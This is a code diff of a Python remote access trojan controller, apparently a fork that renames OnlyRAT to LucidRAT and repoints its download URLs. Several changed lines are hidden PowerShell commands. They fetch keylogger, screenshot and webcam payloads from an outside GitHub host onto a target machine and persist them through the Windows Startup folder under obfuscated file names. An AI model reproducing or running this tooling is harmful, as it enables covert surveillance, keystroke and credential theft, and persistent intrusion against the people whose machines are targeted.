@@ -79,7 +79,7 @@ options_menu = """
 
 username = getpass.getuser() # gets username
 header = f"[~] {username}@onlyrat $ " # sets up user input interface
-remote_path = "raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main" # url path for OnlyRAT files
+remote_path = "raw.githubusercontent.com/Lucidif3r/LucidRAT/main" # url path for LucidRAT files
 local_path = f"/home/{username}/.LucidRAT" if username != "root" else "/root/.LucidRAT" # gets path of LucidRAT
 
 # random text generator for obfuscation
@@ -187,7 +187,7 @@ def keylogger(address, password, username, working):
 
     print("\n[*] Prepping keylogger...")
     # web requests
-    keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/keylogger.ps1 -OutFile {working}/KHRgMHYmdT.ps1\""
+    keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/keylogger.ps1 -OutFile {working}/KHRgMHYmdT.ps1\""
     controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/KHRgMHYmdT.ps1 >> GiLqXiexKP.cmd"
     print("[+] Keylogger prepped")
 
@@ -296,7 +296,7 @@ def update():
     print("\n[*] Checking for updates...")
 
     # get latest version nubmer
-    os.system(f"curl https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")
+    os.system(f"curl https://raw.githubusercontent.com/Lucidif3r/LucidRAT/main/version.txt | tee ~/.LucidRAT/latest.txt")
 
     # save version nubmers to memory
     current_version = float(open(f"{local_path}/version.txt", "r").read())
@@ -403,7 +403,7 @@ def cli(arguments):
             # installs screen capture option
             elif option == "install screencapture":
                 print("\n[*] Installing screen capture...")
-                install_screencaputre = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/screenshot.ps1 -OutFile {working_direcory}/SbQRViPjIq.ps1\""
+                install_screencaputre = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/screenshot.ps1 -OutFile {working_direcory}/SbQRViPjIq.ps1\""
                 add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/SbQRViPjIq.ps1 >> GiLqXiexKP.cmd"
 
                 remote_command(ipv4, password, install_screencaputre)
@@ -436,7 +436,7 @@ def cli(arguments):
             elif option == "install webcam":
                 print("\n[*] Installing webcam capture...")
 
-                install_webcam = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/webcam.ps1 -OutFile {working_direcory}/bNOEXCxyVp/LIspiXrVAu.ps1\""
+                install_webcam = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/Lucidif3r/LucidRAT/main/payloads/webcam.ps1 -OutFile {working_direcory}/bNOEXCxyVp/LIspiXrVAu.ps1\""
                 add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell cd $env:temp/bNOEXCxyVp; Start-Process powershell.exe -windowstyle hidden $env:temp/bNOEXCxyVp/LIspiXrVAu.ps1 >> GiLqXiexKP.cmd"
 
                 remote_command(ipv4, password, install_webcam)
@@ -478,9 +478,9 @@ def cli(arguments):
                 else:
                     main()
 
-            # onlyrat manual
+            # lucidrat manual
             elif option == "man" or option == "manual":
-                os.system(f"xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
+                os.system(f"xdg-open https://github.com/Lucidif3r/LucidRAT/blob/main/payloads/manual.md")
 
             # remove installation
             elif option == "remove" or option == "uninstall":
